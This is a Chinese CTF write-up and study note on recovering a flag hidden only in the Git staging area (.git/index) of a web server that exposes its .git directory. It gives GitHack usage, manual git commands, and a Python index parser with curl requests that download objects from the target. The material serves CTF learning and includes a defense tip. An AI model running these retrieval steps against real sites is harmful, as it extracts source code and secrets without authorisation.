## Index 变式 -- 考点精讲

> 前置知识：[[Git泄露|Git 泄露]] -- 先读 Git 泄露主考点，理解 .git 对象模型后再看本变式
>
> 关联教程：[[../../../../../git.md#nav-12|git.md 12 章 git stash]] · [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]] · [[Stash|Stash 变式]]

### 考点变式：暂存区泄露

`git add` 把文件放进**暂存区（index）**，但提交时只写了 tree，不一定把所有暂存文件都收录进去——CTF 出题人会**故意把 flag 留在暂存区里**，而不提交：

| 步骤 | 提交信息（logs 中可见） | 动作 |
|------|------------------------|------|
| 1 | `init` | 初始化仓库，首次提交含 `index.html` 等占位文件 |
| 2 | `add flag` | 把 flag 文件 `git add` 进暂存区，但**tree 里不收录该文件**（或只收录部分） |

**关键点**：flag 文件**只在 `.git/index`（暂存区索引）里**，普通 `git log` / `git diff` / 工作区文件都**看不到它**——这就是陷阱所在。

### 为什么 flag 能只存在于暂存区？

普通解法的盲区在于：**暂存区 ≠ 提交树**。index 里的 blob 对象会被 GitHack 自动还原，但本地 `git log` / 工作区里不会显示暂存条目。出题人把 flag 文件 `git add` 后，tree 对象里不包含该文件（或故意 `git rm` 工作区文件），flag 就"消失"在了提交历史里。

```
.git/index（暂存区）
  ├─ 50x.txt          → blob: xxx...
  ├─ 6193686222744.txt → blob: 98f49a...  ← flag 在这里！
  └─ index.html        → blob: yyy...

HEAD → 提交树（tree 里可能只有 index.html，没有 flag）
```

### 如何看 git 日志信息（排除 Stash 变式）

先看两个日志确认没有 stash：

```bash
# 1. 分支提交历史（只有 init / add flag）
curl -s "http://目标/.git/logs/HEAD"
# 0000000... d0a0dc9 init
# d0a0dc9... 3418cd6 add flag   <-- 最新提交

# 2. logs/refs/stash 不存在 → 不是 stash 变式
curl -s -o /dev/null -w "%{http_code}" "http://目标/.git/logs/refs/stash"
# 404
```

**判断口诀**：`logs/HEAD` 只有 2 次提交 + `refs/stash` 不存在 → flag 大概率在 **暂存区（index）** 里。

### 如何判断 flag 在 git 的哪里（方向判断）

| 线索 | Index 变式 | Log 变式 | Stash 变式 |
|------|-----------|----------|-----------|
| `logs/HEAD` 提交次数 | 2 次（init + add flag） | 3 次+（init → add → remove） | 3-5 次（有 reset） |
| `refs/stash` 存在 | 404 | 404 | **200（有 stash）** |
| flag 在 index 里 | **是（`git ls-files -s` 可见）** | 可能 | 可能 |
| flag 在工作区 | 否 | 是（历史提交） | 是（`git stash apply` 后） |
| 解法方向 | `git ls-files` + `git cat-file -p` | `git log` + `git reset --hard` | `git stash list` + `git stash apply` |

### 题目解法

> CTFHub 技能树位置：CTFHub → Web → Web 信息泄露 → Git泄露（index 变式题）

#### 解法一（GitHack，标准工具链）

```bash
# 1. GitHack 下载完整 .git 目录
git clone https://github.com/BugScanTeam/GitHack
python3 GitHack.py "http://目标/.git/"
# [+] Clone Success. Dist File : ./dist/目标

# 2. GitHack 的 cache_objects 会自动解析 index，还原暂存区文件到工作区
cd dist/目标
ls
# index.html  6193686222744.txt  50x.txt   <-- flag 文件直接出现在工作区！
cat 6193686222744.txt
# ctfhub{xxxxxx}   <-- 拿到 flag
```

#### 解法二（手工 git 命令）

```bash
cd dist/目标

# 1. 查看暂存区所有条目
git ls-files -s
# 100644 9071e0a24f654c88aa97a2273ca595e301b7ada5 0	50x.txt
# 100644 98f49a5407ea57730560f288ffa994ef431fd613 0	6193686222744.txt
# 100644 2c59e3024e3bc350976778204928a21d9ff42d01 0	index.html

# 2. 直接读取暂存区里的 flag 文件 blob
git cat-file -p 98f49a5407ea57730560f288ffa994ef431fd613
# ctfhub{xxxxxx}
```

#### 解法三（手工对象链，理解原理）

```bash
# 1. 下载 .git/index 文件（297B，DIRC 格式）
curl -s "http://目标/.git/index" -o index.bin

# 2. 解析 index，提取文件名和 blob sha
python3 -c "
import struct
f=open('index.bin','rb')
sig=f.read(4); ver=struct.unpack('>I',f.read(4))[0]
n=struct.unpack('>I',f.read(4))[0]
print('DIRC v%d, %d entries' % (ver,n))
off=12
for i in range(n):
    off+=40
    sha=f.read(20).hex(); off+=20
    flags=struct.unpack('>H',f.read(2))[0]; off+=2
    namelen=flags&0xFFF
    name=f.read(namelen).decode(); off+=namelen
    off+=(8-((62+namelen)%8))%8
    print(name, sha)
"
# 50x.txt 9071e0a24f654c88aa97a2273ca595e301b7ada5
# 6193686222744.txt 98f49a5407ea57730560f288ffa994ef431fd613
# index.html 2c59e3024e3bc350976778204928a21d9ff42d01

# 3. 下载 flag 的 blob 对象并解压
curl -s "http://目标/.git/objects/98/f49a5407ea57730560f288ffa994ef431fd613" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# blob 17\0ctfhub{xxxxxx}
# ctfhub{xxxxxx}   <-- flag
```

### 本题真实数据

| 数据 | 值 |
|------|-----|
| 靶机 | `challenge-5a2ad84fa8c43b9a.sandbox.ctfhub.com:10800` |
| index 条目数 | 3（DIRC v2） |
| flag 文件名 | `6193686222744.txt` |
| flag blob sha | `98f49a5407ea57730560f288ffa994ef431fd613` |
| logs/HEAD 提交 | init (`d0a0dc9f...`) → add flag (`3418cd63...`) |
| refs/stash | 不存在（404） |
| objects/info/packs | 不存在（loose objects） |

### 易错点

| 易错点 | 说明 |
|-------|------|
| **只看 git log 会漏** | `git log` 只显示提交历史，暂存区条目不在 log 里 |
| **git diff 可能是空** | 暂存区与工作区一致时 diff 无输出，flag 不在 diff 里 |
| **GitHack 还原的是 index 版** | GitHack 的 `cache_objects` 解析 index，flag 文件会直接出现在 dist 工作区 |
| **别被 add flag 的名字骗了** | 日志里有 "add flag" 提交，但 flag 文件不在 tree 里（只在 index） |
| **git ls-files 才是金矿** | 暂存区泄露的终极判据：`git ls-files -s` 列出所有暂存条目 |

### 同类变式（信息泄露大类）

| 考点 | 说明 | 终端提取 |
|------|------|---------|
| **Git 泄露**（主考点） | .git 目录可访问，历史源码全还原 | `gitdump URL` |
| **Git stash 变式** | flag 被 git stash 收进 `refs/stash` | `git dump URL`（自动探测 stash） |
| **Git index 变式**（本题） | flag 仅在暂存区，不在提交树里 | `git ls-files -s` + `git cat-file -p` |
| **SVN 泄露** | `.svn/` 目录可访问，同原理还原历史 | 专用工具或手工下载 `.svn` |
| **HG 泄露** | `.hg/` 目录可访问，fncache + revlog 全泄露 | `hgdump URL` |
| **备份文件下载** | 各种备份文件泄露源码/文件清单 | 见 [[../备份文件下载/bak文件|bak文件]]、[[../备份文件下载/网站源码|网站源码]] |
| **vim 缓存** | `.index.php.swp` 残留源码 | 见 [[../备份文件下载/vim缓存|vim缓存]] |
| **DS_Store** | macOS 目录元数据泄露文件清单 | `dsstore --notes URL/.DS_Store`，见 [[../备份文件下载/DS_Store|DS_Store]] |
| 目录索引泄露 | 目录列表直接可见文件名 | 见 [[../目录遍历|目录遍历]] |
| phpinfo | 环境变量/配置泄露 | 见 [[../phpinfo|phpinfo]] |

### 核心知识点总结

| 概念 | 说明 |
|------|------|
| index = 暂存区 | `git add` 后文件进入 index，不一定被提交收录 |
| DIRC 格式 | index 二进制格式，文件名 + blob sha1，解析后可提取 flag |
| `git ls-files -s` | 暂存区的可读版，列出所有暂存条目及 blob sha |
| `git cat-file -p` | 按 sha 读取 git 对象内容，直接读暂存区 blob |
| GitHack `cache_objects` | 自动解析 index 还原文件，flag 文件直接出现在 dist 目录 |
| 与 Log/Stash 区分 | Log 看提交历史，Stash 看 refs/stash，Index 看 index |
| 防御角度 | 部署不带 .git；服务器禁止访问隐藏目录 |

### 关联教程

- [[Git泄露|Git 泄露主考点]] -- 本变式的前置知识
- [[Stash|Stash 变式]] -- 同属 Git 泄露变式，flag 藏在 stash 里
- [[../../../../../git.md#nav-12|git.md 12 章 git stash]] -- stash 命令族与查看记录
- [[../../../../../git.md#nav-17|git.md 17 章内部原理与文件存储]] -- 对象模型与手动读取
- [[../备份文件下载/DS_Store|DS_Store]] -- dsstore 工具（gitdump 的姊妹工具）
- [[../备份文件下载/bak文件|bak文件]] -- 单文件备份直接泄露源码
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
- [[../../../ctf解法与理论总目录|CTF 总目录]] -- CTF 理论学习与练习平台
